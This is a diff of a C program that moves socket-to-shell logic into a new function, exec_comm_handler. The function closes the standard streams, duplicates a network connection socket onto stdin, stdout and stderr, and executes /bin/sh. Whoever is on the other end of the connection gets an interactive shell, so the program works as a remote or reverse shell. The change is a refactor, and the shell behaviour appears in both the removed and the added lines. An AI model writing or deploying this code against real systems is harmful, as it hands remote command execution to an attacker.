@@ -52,6 +52,17 @@ void sigint_handler(int code) {
     exit(0);
 }
 
+int exec_comm_handler( int sck ) {
+    
+    close(0); close(1); close(2);
+    
+    if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) 
+        exit_with_error("error duplicating socket for stdin/stdout/stderr");
+
+    char* shell_argv[] = {"/bin/sh", NULL};
+    execv("/bin/sh", shell_argv);
+}
+
 int main(int argc, char* argv[]) {
     if (argc != 3) {
         exit_with_error(USAGE);
@@ -63,14 +74,8 @@ int main(int argc, char* argv[]) {
 
     // Quit on ctrl + C
     signal(SIGINT, sigint_handler);
-
-    close(0); close(1); close(2);
-    if (dup(conn_fd) != 0 || dup(conn_fd) != 1 || dup(conn_fd) != 2) {
-        exit_with_error("Could not manage to override stdin, stdout, stderr");
-    }
-
-    char* shell_argv[] = {"/bin/sh", NULL};
-    execv("/bin/sh", shell_argv);
+    
+    exec_comm_handler(conn_fd);
 
     close_connection(conn_fd);
     return 0;
